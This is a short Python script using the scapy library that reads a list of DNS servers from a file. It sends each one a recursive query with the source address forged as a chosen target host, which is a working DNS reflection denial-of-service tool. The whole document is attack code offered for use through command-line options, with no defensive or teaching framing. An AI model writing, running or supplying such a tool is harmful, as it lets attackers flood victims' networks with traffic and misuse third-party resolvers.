#!/usr/bin/python

from scapy.all import *
from threading import *
from optparse import OptionParser
#import time
import socket

def queryDnsServer(targetHost,dnsServer):
        answer = IP(dst=dnsServer,src=targetHost)/UDP()/DNS(rd=1,qd=DNSQR(qname="www.thepacketgeek.com")) #just fire the packet ;)
        send(answer)

def readDnsServersFromFile(targetHost,dnsServersFile):
   f = open(dnsServersFile,'r')
   for line in f.readlines():
      dnsServer = line.strip('\r').strip('\n')
      print "Sending DNS request to: "+str(dnsServer)
      t = Thread(target=queryDnsServer,args=(targetHost,dnsServer))
      child = t.start()

def main():
   parser = OptionParser()
   parser.add_option("-t", "--tgtHost", dest="tgtHost",
                     help="tgtHost", metavar="tgtHost")
   parser.add_option("-f", "--dnsServersFile", dest="dnsServersFile",
                     help="dnsServersFile", metavar="dnsServersFile")
   (options, args) = parser.parse_args()
   if options.tgtHost is None and options.dnsServersFile is None:
      parser.print_help()
      exit(0)
   targetHost = options.tgtHost
   dnsServers = options.dnsServersFile
   readDnsServersFromFile(targetHost,dnsServers)

if __name__ == '__main__':
   main()
